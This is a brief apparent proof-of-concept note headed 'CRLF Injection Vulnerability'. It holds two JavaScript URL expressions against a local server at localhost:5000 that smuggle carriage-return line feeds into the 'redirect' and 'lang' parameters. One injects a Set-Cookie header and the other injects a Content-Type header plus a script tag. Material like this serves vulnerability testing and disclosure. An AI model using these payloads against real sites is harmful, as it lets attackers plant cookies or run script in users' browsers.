CRLF Injection Vulnerability

```js
"http://localhost:5000/?redirect=" + encodeURIComponent("http://localhost:5000/test\r\nSet-Cookie: maliciousCookie=maliciousCookie")
```

```js
"http://localhost:5000/?lang=" + encodeURIComponent("zh-TW\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>")
```